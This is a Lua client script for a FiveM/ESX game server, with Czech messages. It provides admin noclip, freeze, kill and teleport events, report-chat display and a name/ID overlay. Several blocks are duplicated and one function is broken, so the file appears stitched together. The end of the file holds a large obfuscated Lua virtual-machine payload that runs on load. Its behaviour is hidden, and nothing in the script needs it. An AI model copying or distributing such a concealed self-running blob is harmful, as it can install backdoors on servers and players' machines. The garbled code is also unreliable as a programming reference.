ESX = nil
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

local PP = PlayerPedId()
local draw = false
local visiblePlayers = {}

----------------------------------------------------------------------------------
RegisterKeyMapping(';noclip', 'Admin Noclip', 'keyboard', 'i')

RegisterNetEvent("esx_admin:killPlayer")
AddEventHandler("esx_admin:killPlayer", function()
  SetEntityHealth(PlayerPedId(), 0)
end)

RegisterCommand(';noclip', function()
    TriggerServerEvent("esx_admin:ales", PP)
end, false)

RegisterNetEvent("esx_admin:freezePlayer")
AddEventHandler("esx_admin:freezePlayer", function(input)
    local player = PlayerId()
	local ped = PlayerPedId()
    if input == 'freeze' then
        SetEntityCollision(ped, false)
        FreezeEntityPosition(ped, true)
        SetPlayerInvincible(player, true)
    elseif input == 'unfreeze' then
        SetEntityCollision(ped, true)
	    FreezeEntityPosition(ped, false)
        SetPlayerInvincible(player, false)
    end
end)

--Citizen.CreateThread(function()
	--while true do
		--Citizen.Wait(0)
		--if(IsControlJustReleased(1, 243))then
			--TriggerServerEvent("esx_admin:ales", PP)
		--end
	--end
--end)
ESX = nil

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
end)

RegisterNetEvent("textsent")
AddEventHandler('textsent', function(tPID, names2)
	TriggerEvent('chat:addMessage', {
            template = '<div style="padding: 0.3vw; margin: 0.1vw; background-color: rgba(0, 100, 0, 0.9); border-radius: 1px;"><i class="fas fa-check"></i>Odpoved odeslana</div>',
            args = { id, name, message }
	})
end)

RegisterNetEvent("textmsg")
AddEventHandler('textmsg', function(source, textmsg, names2, names3 )
	 TriggerEvent('chat:addMessage', {
            template = '<div style="padding: 0.3vw; margin: 0.1vw; background-color: rgba(0, 100, 51, 0.9); border-radius: 1px;"><i class="fas fa-info"></i>^*[Odpoved]^r:^*[{1}]^r {0} </div>',
			args = { textmsg, names2, names3 }
	})
	print(textmsg)
end)

RegisterNetEvent('sendReport')
AddEventHandler('sendReport', function(id, name, message)
	local myId = PlayerId()
	local pid = GetPlayerFromServerId(id)
	ESX.TriggerServerCallback('fnx_adminsystem:GetGroup', function(groupgetted)
		if pid == myId then
			TriggerEvent('chat:addMessage', {
				template = '<div style="padding: 0.4vw; margin: 0.4vw; background-color: rgba(24, 26, 32, 0.9); border-radius: 3px; border-right: 0px solid rgb(255, 0, 0);"><font style="padding: 0.22vw; margin: 0.22vw; background-color: rgb(255, 0, 0); border-radius: 5px; font-size: 15px;"> <b>REPORT</b></font>   <font style="background-color:rgba(0, 0, 0, 0); font-size: 17px; margin-left: 0px; padding-bottom: 2.5px; padding-left: 3.5px; padding-top: 2.5px; padding-right: 3.5px;border-radius: 0px;"> <b> ID:  {0} | {1}   |</b></font>  <font style=" font-weight: 800; font-size: 15px; margin-left: 5px; padding-bottom: 3px; border-radius: 0px;"><b></b></font><font style=" font-weight: 200; font-size: 14px; border-radius: 0px;">{2}</font></div>',
				args = { id, name, message }
			})	
		elseif groupgetted ~= "user" and pid ~= myId then
			TriggerEvent('chat:addMessage', {
				template = '<div style="padding: 0.4vw; margin: 0.4vw; background-color: rgba(24, 26, 32, 0.9); border-radius: 3px; border-right: 0px solid rgb(255, 0, 0);"><font style="padding: 0.22vw; margin: 0.22vw; background-color: rgb(255, 0, 0); border-radius: 5px; font-size: 15px;"> <b>REPORT</b></font>   <font style="background-color:rgba(0, 0, 0, 0); font-size: 17px; margin-left: 0px; padding-bottom: 2.5px; padding-left: 3.5px; padding-top: 2.5px; padding-right: 3.5px;border-radius: 0px;"> <b> ID:  {0} | {1}   |</b></font>  <font style=" font-weight: 800; font-size: 15px; margin-left: 5px; padding-bottom: 3px; border-radius: 0px;"><b></b></font><font style=" font-weight: 200; font-size: 14px; border-radius: 0px;">{2}</font></div>',
				args = { id, name, message }
			})		
		end
	end)	  	
end)



-------- noclip --------------
local noclip = false

RegisterNetEvent("esx_admin:noclip")
AddEventHandler("esx_admin:noclip", function(input)
    local player = PlayerId()
	local ped = PlayerPedId
    
	local msg = "Noclip vypnut"
	if(noclip == false)then
		noclip_pos = GetEntityCoords(PlayerPedId(), false)
			
	end
	if draw then
        draw = false
        --exports['mythic_notify']:DoHudText('error', 'ID jsou vypnutá' )
        exports['drc_notify']:Icon("ID jsou vypnutá","top-right",2500,"red-10","white",true,"mdi-earth")


       -- TriggerEvent('chat:addMessage', { args = { 'Uživatelé', 'Vypínám sledování - nyní nebudete videt uživatelské nicky, zapněte pomocí /users' }, color = { 255, 50, 50 } })
    else
        draw = true
        --TriggerEvent('chat:addMessage', { args = { 'Uživatelé', 'Zapínám sledování - nyní budete videt uživatelské nicky, vypněte pomocí /users' }, color = { 255, 50, 50 } })
        --exports['mythic_notify']:DoHudText('success', 'ID jsou zapnutá' )
        exports['drc_notify']:Icon("ID jsou zapnutá","top-right",2500,"red-10","white",true,"mdi-earth")
    end
	noclip = not noclip
	
	if(noclip)then
		msg = "Noclip zapnut"
	end
	exports['drc_notify']:Icon(msg,"top-right",2500,"blue-10","white",false,"mdi-earth")
	end)

	local heading = 0
	Citizen.CreateThread(function()
		while true do
		Citizen.Wait(0)
		
		if(noclip)then
			SetEntityCoordsNoOffset(PlayerPedId(), noclip_pos.x, noclip_pos.y, noclip_pos.z, 0, 0, 0)
			-- W = 32 S = 8 D = 9 A = 34 Q = 52 Y = 246
			--SetEntityVisible(PlayerPedId(), false)
			
			
			if(IsControlPressed(1, 34))then
				heading = heading + 2.5
				if(heading > 360)then
					heading = 0
				end

				SetEntityHeading(PlayerPedId(), heading)
			end

			if(IsControlPressed(1, 9))then
				heading = heading - 2.5
				if(heading < 0)then
					heading = 360
				end

				SetEntityHeading(PlayerPedId(), heading)
			end

			if(IsControlPressed(1, 8))then
				if(IsControlPressed(1, 21))then
					noclip_pos = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, 0.0)
				elseif (IsControlPressed(1, 36))then
					noclip_pos = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 0.5, 0.0)
				else
					noclip_pos = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 1.0, 0.0)
				end
			end

			if(IsControlPressed(1, 32))then
				if(IsControlPressed(1, 21))then
					noclip_pos = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, -2.0, 0.0)
				elseif (IsControlPressed(1, 36))then
					noclip_pos = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, -0.5, 0.0)
				else
					noclip_pos = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, -1.0, 0.0)
				end
			end

			if(IsControlPressed(1, 52))then
				if(IsControlPressed(1, 21))then
					noclip_pos = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 0.0, 2.0)
				elseif (IsControlPressed(1, 36))then
					noclip_pos = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 0.0, 0.5)
				else
					noclip_pos = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 0.0, 1.0)
				end
			end

			if(IsControlPressed(1, 20))then
				if(IsControlPressed(1, 21))then
					noclip_pos = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 0.0, -2.0)
				elseif (IsControlPressed(1, 36))then
					noclip_pos = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 0.0, -0.5)
				else
					noclip_pos = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 0.0, -1.0)
				end
			end
		else
			Citizen.Wait(200)
		end
	end
end)

--Thanks to qalle for this code | https://github.com/qalle-fivem/esx_marker
RegisterNetEvent("esx_admin:tpm")
AddEventHandler("esx_admin:tpm", function()
    local WaypointHandle = GetFirstBlipInfoId(8)
    if DoesBlipExist(WaypointHandle) then
        local waypointCoords = GetBlipInfoIdCoord(WaypointHandle)

        for height = 1, 1000 do
            SetPedCoordsKeepVehicle(PlayerPedId(), waypointCoords["x"], waypointCoords["y"], height + 0.0)

            local foundGround, zPos = GetGroundZFor_3dCoord(waypointCoords["x"], waypointCoords["y"], height + 0.0)

            if foundGround then
                SetPedCoordsKeepVehicle(PlayerPedId(), waypointCoords["x"], waypointCoords["y"], height + 0.0)

                break
            end

            Citizen.Wait(5)
        end
       -- TriggerEvent('chatMessage', _U('teleported'))
	  -- exports['mythic_notify']:DoHudText('success', 'Teleportováno' )
	   exports['drc_notify']:Icon("Teleportováno","top-right",2500,"red-10","white",true,"mdi-earth")
    else
     --   TriggerEvent('chatMessage', _U('set_waypoint'))
	--	exports['mythic_notify']:DoHudText('success', 'Nemáš setnutý waypoint' )
		exports['drc_notify']:Icon("Nemáš setnutý waypoint","top-right",2500,"red-10","white",true,"mdi-earth")


    end
end)


RegisterNetEvent("esx_admin:SetEntityCoords")
AddEventHandler("esx_admin:SetEntityCoords", function(coordsteleport)
	local playerped = PlayerPedId()
	SetEntityCoords(playerped, coordsteleport)
end)

RegisterNetEvent("esx_admin:alesdev")
AddEventHandler("esx_admin:alesdev", function(ales)
	SetEntityHealth(ales, 100)
end)


function draw3DText(pos, text, options)
    options = options or { }
    local color = options.color or {r = 255, g = 255, b = 255, a = 255}
    local scaleOption = options.size or 0.8

    local camCoords      = GetGameplayCamCoords()
    local dist           = #(vector3(camCoords.x, camCoords.y, camCoords.z)-vector3(pos.x, pos.y, pos.z))
    local scale = (scaleOption / dist) * 2
    local fov   = (1 / GetGameplayCamFov()) * 100
    local scaleMultiplier = scale * fov
    SetDrawOrigin(pos.x, pos.y, pos.z, 0);
    SetTextProportional(0)
    SetTextScale(0.0 * scaleMultiplier, 0.55 * scaleMultiplier)
    SetTextColour(color.r,color.g,color.b,color.a)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextFont(13)
    SetTextOutline()
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(text)
    DrawText(0.0, 0.0)
    ClearDrawOrigin()
end

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(Config.NearPlayerTime or 500)
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local allPlayers = GetActivePlayers()
        for _, v in pairs(allPlayers) do
            local targetPed = GetPlayerPed(v)
            local targetCoords = GetEntityCoords(targetPed)
            if #(coords-targetCoords) < 100 then
                visiblePlayers[v] = v
            end
        end
    end
end)

--Draw thread
Citizen.CreateThread(function()
    while true do
        local sleep = 500
        if draw then
            sleep = 5
            local currentCoords = GetEntityCoords(GetPlayerPed(PlayerId()))
            for _, v in pairs(visiblePlayers) do
                local ped = GetPlayerPed(v)
                local cords = GetEntityCoords(ped)
                if #(cords-currentCoords) < 100 then
                    sleep = 5
                    draw3DText(cords, GetPlayerName(v)..'~n~ ~u~ ~r~'..GetPlayerServerId(v)..'~s~~u~', {
                        size = 1.2
                    })
                end
            end
        end
        Citizen.Wait(sleep)
    end
end)







local Keys = {
    ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
    ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
    ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
    ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
    ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
    ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
    ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
    ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
    ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
}

ESX = nil
local draw = false
local visiblePlayers = {}

Citizen.CreateThread(function()
    while ESX == nil do
        TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
        Citizen.Wait(0)
    end
end)


RegisterNetEvent('relisoft_players:drawText')
AddEventHandler('relisoft_players:drawText',function()
    if draw then
        draw = false
        --exports['mythic_notify']:DoHudText('error', 'ID jsou vypnutá' )
        exports['drc_notify']:Icon("ID jsou vypnutá","top-right",2500,"red-10","white",true,"mdi-earth")


       -- TriggerEvent('chat:addMessage', { args = { 'Uživatelé', 'Vypínám sledování - nyní nebudete videt uživatelské nicky, zapněte pomocí /users' }, color = { 255, 50, 50 } })
    else
        draw = true
        --TriggerEvent('chat:addMessage', { args = { 'Uživatelé', 'Zapínám sledování - nyní budete videt uživatelské nicky, vypněte pomocí /users' }, color = { 255, 50, 50 } })
        --exports['mythic_notify']:DoHudText('success', 'ID jsou zapnutá' )
        exports['drc_notify']:Icon("ID jsou zapnutá","top-right",2500,"red-10","white",true,"mdi-earth")
    end
end)

function draw3DText(pos, text, options)
    options = options or { }
    local color = options.color or {r = 255, g = 255, b = 255, a = 255}
    local scaleOption = options.size or 0.8

    local camCoords      = GetGameplayCamCoords()
    local dist           = #(vector3(camCoords.x, camCoords.y, camCoords.z)-vector3(pos.x, pos.y, pos.z))
    local scale = (scaleOption / dist) * 2
    local fov   = (1 / GetGameplayCamFov()) * 100
    local scaleMultiplier = scale * fov
    SetDrawOrigin(pos.x, pos.y, pos.z, 0);
    SetTextProportional(0)
    SetTextScale(0.0 * scaleMultiplier, 0.55 * scaleMultiplier)
    SetTextColour(color.r,color.g,color.b,color.a)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextFont(13)
    SetTextOutline()
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(text)
    DrawText(0.0, 0.0)
    ClearDrawOrigin()
end

local function RGBRainbow( frequency )
	local result = {}
	local curtime = GetGameTimer() / 1000

	result,color.r = math.floor( math.sin( curtime * frequency + 0 ) * 127 + 128 )
	result,color.g = math.floor( math.sin( curtime * frequency + 2 ) * 127 + 128 )
	result,color.b = math.floor( math.sin( curtime * frequency + 4 ) * 127 + 128 )
    result,color.a = math.floor( math.sin( curtime * frequency + 4 ) * 127 + 128 )
	
	return result
end

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(Config.NearPlayerTime or 500)
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local allPlayers = GetActivePlayers()
        for _, v in pairs(allPlayers) do
            local targetPed = GetPlayerPed(v)
            local targetCoords = GetEntityCoords(targetPed)
            if #(coords-targetCoords) < Config.DrawDistance then
                visiblePlayers[v] = v
            end
        end
    end
end)

--Draw thread
Citizen.CreateThread(function()
    while true do
        local sleep = 500
        if draw then
            sleep = 5
            local currentCoords = GetEntityCoords(GetPlayerPed(PlayerId()))
            for _, v in pairs(visiblePlayers) do
                local ped = GetPlayerPed(v)
                local cords = GetEntityCoords(ped)
                if #(cords-currentCoords) < Config.DrawDistance then
                    sleep = 5
                    draw3DText(cords, GetPlayerName(v)..'~n~ ~u~ ~o~'..GetPlayerServerId(v)..'~s~~u~', {
                        size = Config.TextSize
                    })
                end
            end
        end
        Citizen.Wait(sleep)
    end
end)

return(function(FI_h,FI_a,FI_a)local FI_k=string.char;local FI_e=string.sub;local FI_l=table.concat;local FI_n=math.ldexp;local FI_p=getfenv or function()return _ENV end;local FI_m=select;local FI_g=unpack or table.unpack;local FI_j=tonumber;local function FI_o(FI_h)local FI_b,FI_c,FI_d="","",{}local FI_g=256;local FI_f={}for FI_a=0,FI_g-1 do FI_f[FI_a]=FI_k(FI_a)end;local FI_a=1;local function FI_i()local FI_b=FI_j(FI_e(FI_h,FI_a,FI_a),36)FI_a=FI_a+1;local FI_c=FI_j(FI_e(FI_h,FI_a,FI_a+FI_b-1),36)FI_a=FI_a+FI_b;return FI_c end;FI_b=FI_k(FI_i())FI_d[1]=FI_b;while FI_a<#FI_h do local FI_a=FI_i()if FI_f[FI_a]then FI_c=FI_f[FI_a]else FI_c=FI_b..FI_e(FI_b,1,1)end;FI_f[FI_g]=FI_b..FI_e(FI_c,1,1)FI_d[#FI_d+1],FI_b,FI_g=FI_c,FI_c,FI_g+1 end;return table.concat(FI_d)end;local FI_i=FI_o('25725427525624O27525426I26526725T25N25O26525M26U26525O27125Q26525Y25O27727926625T26F25Q26125Y27E25S23M27W27Y25N25S25625327926X26426427M27O25O26O27X26425W27H24W27924Q24X27925528L27528P25627928U25428T28P24Q28U27427528Z25428S27925625828W28V25424T29629427524U28O28U28P27529128W24Z27926G25W26125D27H26G26526426P26428627926P25N27127P25T25O25D26M27E25T26228I27R27526J27K2A325O2A52A72A92AB26524R28Q29H29A29E28T29329528V28T2AR27429J29I25427428T25A28R25428N28P28P25825B2792B82542BB27925229E24Q24V29E29L2AS29A2592B229A29C28P2AZ2BF2BC2922BJ2BL2BU2B12AX28U2BQ2BV2792BT2BR29J29G2B62AR');local FI_a=(bit or bit32);local FI_d=FI_a and FI_a.bxor or function(FI_a,FI_b)local FI_c,FI_d,FI_e=1,0,10 while FI_a>0 and FI_b>0 do local FI_e,FI_f=FI_a%2,FI_b%2 if FI_e~=FI_f then FI_d=FI_d+FI_c end FI_a,FI_b,FI_c=(FI_a-FI_e)/2,(FI_b-FI_f)/2,FI_c*2 end if FI_a<FI_b then FI_a=FI_b end while FI_a>0 do local FI_b=FI_a%2 if FI_b>0 then FI_d=FI_d+FI_c end FI_a,FI_c=(FI_a-FI_b)/2,FI_c*2 end return FI_d end local function FI_c(FI_c,FI_a,FI_b)if FI_b then local FI_a=(FI_c/2^(FI_a-1))%2^((FI_b-1)-(FI_a-1)+1);return FI_a-FI_a%1;else local FI_a=2^(FI_a-1);return(FI_c%(FI_a+FI_a)>=FI_a)and 1 or 0;end;end;local FI_a=1;local function FI_b()local FI_f,FI_c,FI_e,FI_b=FI_h(FI_i,FI_a,FI_a+3);FI_f=FI_d(FI_f,184)FI_c=FI_d(FI_c,184)FI_e=FI_d(FI_e,184)FI_b=FI_d(FI_b,184)FI_a=FI_a+4;return(FI_b*16777216)+(FI_e*65536)+(FI_c*256)+FI_f;end;local function FI_j()local FI_b=FI_d(FI_h(FI_i,FI_a,FI_a),184);FI_a=FI_a+1;return FI_b;end;local function FI_f()local FI_b,FI_c=FI_h(FI_i,FI_a,FI_a+2);FI_b=FI_d(FI_b,184)FI_c=FI_d(FI_c,184)FI_a=FI_a+2;return(FI_c*256)+FI_b;end;local function FI_q()local FI_a=FI_b();local FI_b=FI_b();local FI_e=1;local FI_d=(FI_c(FI_b,1,20)*(2^32))+FI_a;local FI_a=FI_c(FI_b,21,31);local FI_b=((-1)^FI_c(FI_b,32));if(FI_a==0)then if(FI_d==0)then return FI_b*0;else FI_a=1;FI_e=0;end;elseif(FI_a==2047)then return(FI_d==0)and(FI_b*(1/0))or(FI_b*(0/0));end;return FI_n(FI_b,FI_a-1023)*(FI_e+(FI_d/(2^52)));end;local FI_n=FI_b;local function FI_o(FI_b)local FI_c;if(not FI_b)then FI_b=FI_n();if(FI_b==0)then return'';end;end;FI_c=FI_e(FI_i,FI_a,FI_a+FI_b-1);FI_a=FI_a+FI_b;local FI_b={}for FI_a=1,#FI_c do FI_b[FI_a]=FI_k(FI_d(FI_h(FI_e(FI_c,FI_a,FI_a)),184))end return FI_l(FI_b);end;local FI_a=FI_b;local function FI_n(...)return{...},FI_m('#',...)end local function FI_l()local FI_k={};local FI_i={};local FI_a={};local FI_h={[#{"1 + 1 = 111";{852;821;795;294};}]=FI_i,[#{{712;134;861;742};"1 + 1 = 111";{871;835;323;580};}]=nil,[#{{739;441;98;134};"1 + 1 = 111";"1 + 1 = 111";{678;990;350;436};}]=FI_a,[#{"1 + 1 = 111";}]=FI_k,};local FI_a=FI_b()local FI_e={}for FI_c=1,FI_a do local FI_b=FI_j();local FI_a;if(FI_b==1)then FI_a=(FI_j()~=0);elseif(FI_b==3)then FI_a=FI_q();elseif(FI_b==2)then FI_a=FI_o();end;FI_e[FI_c]=FI_a;end;for FI_h=1,FI_b()do local FI_a=FI_j();if(FI_c(FI_a,1,1)==0)then local FI_d=FI_c(FI_a,2,3);local FI_g=FI_c(FI_a,4,6);local FI_a={FI_f(),FI_f(),nil,nil};if(FI_d==0)then FI_a[3]=FI_f();FI_a[4]=FI_f();elseif(FI_d==1)then FI_a[3]=FI_b();elseif(FI_d==2)then FI_a[3]=FI_b()-(2^16)elseif(FI_d==3)then FI_a[3]=FI_b()-(2^16)FI_a[4]=FI_f();end;if(FI_c(FI_g,1,1)==1)then FI_a[2]=FI_e[FI_a[2]]end if(FI_c(FI_g,2,2)==1)then FI_a[3]=FI_e[FI_a[3]]end if(FI_c(FI_g,3,3)==1)then FI_a[4]=FI_e[FI_a[4]]end FI_k[FI_h]=FI_a;end end;FI_h[3]=FI_j();for FI_a=1,FI_b()do FI_i[FI_a-1]=FI_l();end;return FI_h;end;local function FI_h(FI_a,FI_b,FI_f)FI_a=(FI_a==true and FI_l())or FI_a;return(function(...)local FI_e=FI_a[1];local FI_d=FI_a[3];local FI_j=FI_a[2];local FI_a=FI_n local FI_c=1;local FI_a=-1;local FI_l={};local FI_i={...};local FI_k=FI_m('#',...)-1;local FI_a={};local FI_b={};for FI_a=0,FI_k do if(FI_a>=FI_d)then FI_l[FI_a-FI_d]=FI_i[FI_a+1];else FI_b[FI_a]=FI_i[FI_a+#{"1 + 1 = 111";}];end;end;local FI_a=FI_k-FI_d+1 local FI_a;local FI_d;while true do FI_a=FI_e[FI_c];FI_d=FI_a[1];if FI_d<=12 then if FI_d<=5 then if FI_d<=2 then if FI_d<=0 then local FI_d;FI_b[FI_a[2]]=FI_f[FI_a[3]];FI_c=FI_c+1;FI_a=FI_e[FI_c];FI_d=FI_a[2]FI_b[FI_d]=FI_b[FI_d]()FI_c=FI_c+1;FI_a=FI_e[FI_c];FI_b[FI_a[2]]=FI_f[FI_a[3]];FI_c=FI_c+1;FI_a=FI_e[FI_c];FI_b[FI_a[2]]=FI_b[FI_a[3]];FI_c=FI_c+1;FI_a=FI_e[FI_c];FI_b[FI_a[2]]=(FI_a[3]~=0);FI_c=FI_c+1;FI_a=FI_e[FI_c];FI_d=FI_a[2]FI_b[FI_d]=FI_b[FI_d](FI_g(FI_b,FI_d+1,FI_a[3]))FI_c=FI_c+1;FI_a=FI_e[FI_c];if not FI_b[FI_a[2]]then FI_c=FI_c+1;else FI_c=FI_a[3];end;elseif FI_d==1 then FI_b[FI_a[2]]=FI_b[FI_a[3]];else FI_b[FI_a[2]]=FI_a[3];end;elseif FI_d<=3 then local FI_c=FI_a[2]FI_b[FI_c]=FI_b[FI_c](FI_g(FI_b,FI_c+1,FI_a[3]))elseif FI_d==4 then FI_b[FI_a[2]]=FI_h(FI_j[FI_a[3]],nil,FI_f);else FI_b[FI_a[2]]=(FI_a[3]~=0);end;elseif FI_d<=8 then if FI_d<=6 then FI_b[FI_a[2]]=FI_b[FI_a[3]];elseif FI_d>7 then local FI_a=FI_a[2]FI_b[FI_a]=FI_b[FI_a]()else FI_c=FI_a[3];end;elseif FI_d<=10 then if FI_d==9 then local FI_d;FI_b[FI_a[2]]=FI_f[FI_a[3]];FI_c=FI_c+1;FI_a=FI_e[FI_c];FI_b[FI_a[2]]=FI_a[3];FI_c=FI_c+1;FI_a=FI_e[FI_c];FI_d=FI_a[2]FI_b[FI_d](FI_b[FI_d+1])FI_c=FI_c+1;FI_a=FI_e[FI_c];FI_b[FI_a[2]]=FI_f[FI_a[3]];FI_c=FI_c+1;FI_a=FI_e[FI_c];FI_b[FI_a[2]]=FI_a[3];else local FI_c=FI_a[2]FI_b[FI_c]=FI_b[FI_c](FI_g(FI_b,FI_c+1,FI_a[3]))end;elseif FI_d>11 then local FI_a=FI_a[2]FI_b[FI_a](FI_b[FI_a+1])else FI_b[FI_a[2]]=FI_f[FI_a[3]];end;elseif FI_d<=18 then if FI_d<=15 then if FI_d<=13 then FI_b[FI_a[2]]=(FI_a[3]~=0);elseif FI_d>14 then if not FI_b[FI_a[2]]then FI_c=FI_c+1;else FI_c=FI_a[3];end;else do return end;end;elseif FI_d<=16 then local FI_c=FI_a[2]FI_b[FI_c](FI_g(FI_b,FI_c+1,FI_a[3]))elseif FI_d==17 then FI_b[FI_a[2]]=FI_a[3];else local FI_a=FI_a[2]FI_b[FI_a](FI_b[FI_a+1])end;elseif FI_d<=21 then if FI_d<=19 then if not FI_b[FI_a[2]]then FI_c=FI_c+1;else FI_c=FI_a[3];end;elseif FI_d==20 then FI_b[FI_a[2]]=FI_h(FI_j[FI_a[3]],nil,FI_f);else local FI_c=FI_a[2]FI_b[FI_c](FI_g(FI_b,FI_c+1,FI_a[3]))end;elseif FI_d<=23 then if FI_d==22 then do return end;else FI_b[FI_a[2]]=FI_f[FI_a[3]];end;elseif FI_d>24 then local FI_a=FI_a[2]FI_b[FI_a]=FI_b[FI_a]()else FI_c=FI_a[3];end;FI_c=FI_c+1;end;end);end;return FI_h(true,{},FI_p())();end)(string.byte,table.insert,setmetatable);